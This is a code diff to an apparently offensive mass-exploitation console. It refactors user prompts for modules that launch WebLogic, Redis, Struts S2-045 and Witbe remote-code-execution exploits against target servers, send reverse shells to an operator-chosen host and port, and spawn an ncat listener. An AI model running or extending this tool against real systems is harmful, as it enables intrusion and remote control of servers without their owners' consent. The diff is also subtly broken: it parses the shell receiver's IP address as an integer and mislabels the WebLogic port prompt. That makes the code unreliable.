@@ -20,10 +20,31 @@ proxy = True
 ip_list = 'data/ip_list.txt'
 
 
+# Display traceback?
 def debug_except():
     if input(colors.CYAN + '[?] Display traceback? [y/n] ').strip() == 'y':
         tb = traceback.format_exc()
         console.print_error(str(tb))
+
+
+def input_check(prompt, type=None, choices=None):
+    while True:
+        user_input = str(input(colors.BLUE+prompt+colors.END)).strip().lower()
+        try:
+            if choices != None:
+                if user_input not in choices:
+                    console.print_error("[-] Invalid input")
+                    continue
+                if type == None:
+                    return user_input
+                return type(user_input)
+            elif type != None and choices == None:
+                return type(user_input)
+            else:
+                return user_input
+        except:
+            console.print_error("[-] Invalid input")
+            continue
 
 
 # kill process by name
@@ -202,28 +223,17 @@ scanner_args = []
 
 def weblogic():
     print(colors.BLUE + '\n[*] Welcome to Weblogic exploit' + colors.END)
+    '''
     server_port = input(
         colors.BLUE +
         '[?] What\'s the port of Weblogic server? ' +
         colors.END)
-    os_type = str(
-        input(
-            colors.BLUE +
-            '[?] Windows or Linux? [w/l] ' +
-            colors.END))
-    if str(
-        input(
-            colors.BLUE +
-            '[?] Do you need a reverse shell? [y/n] ' +
-            colors.END)).strip().lower() == 'y':
-        shellServer = input(
-            colors.BLUE +
-            '[?] What\'s the IP of shell receiver? ' +
-            colors.END)
-        port = input(
-            colors.BLUE +
-            '[?] What\'s the port of shell receiver? ' +
-            colors.END)
+    '''
+    server_port = input_check("[?] What's the port of shell server? ", type=int)
+    os_type = input_check('[?] Windows or Linux? [w/l] ', choices=['w', 'l'])
+    if input_check('[?] Do you need a reverse shell? [y/n] ', choices=['y', 'n']) == 'y':
+        shellServer = input_check('[?] What\'s the IP of shell receiver? ', type=int)
+        port = input_check('[?] What\'s the port of shell receiver? ', type=int)
         if os_type.lower() == 'w':
             custom_args = '-l {} -p {} -P {} --silent -T reverse_shell -os win'.format(
                 shellServer, port, server_port).split()
@@ -261,8 +271,7 @@ def weblogic():
 # currently not available
 def redis():
     print(colors.BLUE + '\n[*] Welcome to Redis exploit' + colors.END)
-    answ = input(
-        '[*] Executing redis mass exploit against ./exploits/redis/targets, proceed? [y/n] ')
+    answ = input_check('[*] Executing redis mass exploit against ./exploits/redis/targets, proceed? [y/n] ', choices=['y', 'n'])
     os.chdir('./exploits/redis/')
     if answ.lower() == 'y':
         subprocess.call(['proxychains4', '-q', '-f',
@@ -273,7 +282,7 @@ def redis():
 
 def s2_045():
     print(colors.BLUE + '\n[*] Welcome to S2-045' + colors.END)
-    port = str(input('[?] What\'s the port of your target server? ').strip())
+    port = input_check('[?] What\'s the port of your target server? ', type=int)
 
     # args list
     exploit = 's2_045_cmd.py'
@@ -297,8 +306,8 @@ def witbe():
     print(colors.BLUE + '\n[*] Welcome to Witbe RCE' + colors.END)
 
     # shell server config
-    rhost = str(input('[?] IP of your shell server: ')).strip()
-    rport = str(input('[?] and Port? ')).strip()
+    rhost = input_check('[?] IP of your shell server: ')
+    rport = input_check('[?] and Port? ', type=int)
 
     # exploit config
     exploit = 'witbe.py'
@@ -321,20 +330,11 @@ def attack():
     global proxy_conf
     global proxy
     global scanner_args
-    if str(
-        input(
-            colors.CYAN +
-            '[?] Do you wish to use proxychains? [y/n] ' +
-            colors.END)).strip().lower() == 'y':
+    if input_check('[?] Do you wish to use proxychains? [y/n] ', choices=['y', 'n']) == 'y':
         proxy = True
     else:
         proxy = False
-    answ = str(
-        input(
-            colors.DARKCYAN +
-            colors.BOLD +
-            '\n[?] Do you wish to use\n\n    [a] built-in exploits\n    [m] or launch your own manually?\n\n[=] Your choice: ' +
-            colors.END)).strip()
+    answ = input_check('\n[?] Do you wish to use\n\n    [a] built-in exploits\n    [m] or launch your own manually?\n\n[=] Your choice: ', choices=['a', 'm'])
     if answ == 'a':
         print(
             colors.CYAN +
@@ -343,12 +343,7 @@ def attack():
             colors.END +
             '\n')
         print(console.built_in)
-        answ = int(
-            input(
-                colors.CYAN +
-                colors.BOLD +
-                '[=] Your choice: ' +
-                colors.END))
+        answ = input_check('[=] Your choice: ', type=int, choices=['0', '1', '2', '3', '4'])
         if answ == 2:
             redis()
         elif answ == 1:
@@ -372,16 +367,15 @@ def attack():
         list_exp()
         exploit = input(
             "\n[*] Enter the path (eg. joomla/rce.py) of your exploit: ").strip()
-        jobs = int(input("[?] How many processes each time? "))
+        jobs = input_check("[?] How many processes each time? ", type=int)
         custom_args = []
-        answ = input("[?] Do you need a reverse shell [y/n]? ").strip()
+        answ = input_check("[?] Do you need a reverse shell [y/n]? ", choices=['y', 'n'])
         if answ == 'y':
             lhost = input(
                 "[*] Where do you want me to send shells? ").strip()
-            lport = input(
-                "[*] and at what port? (make sure you have access to that port) ").strip()
+            lport = input_check("[*] and at what port? (make sure you have access to that port) ", type=int)
             custom_args = ['-l', lhost, '-p', lport]
-            answ = input('[*] Do you need me to start a listener? [y/n] ')
+            answ = input_check('[*] Do you need me to start a listener? [y/n] ', choices=['y', 'n'])
             if answ == 'y':
                 print("\n[*] Spawning ncat listener in new window...\n")
                 try:
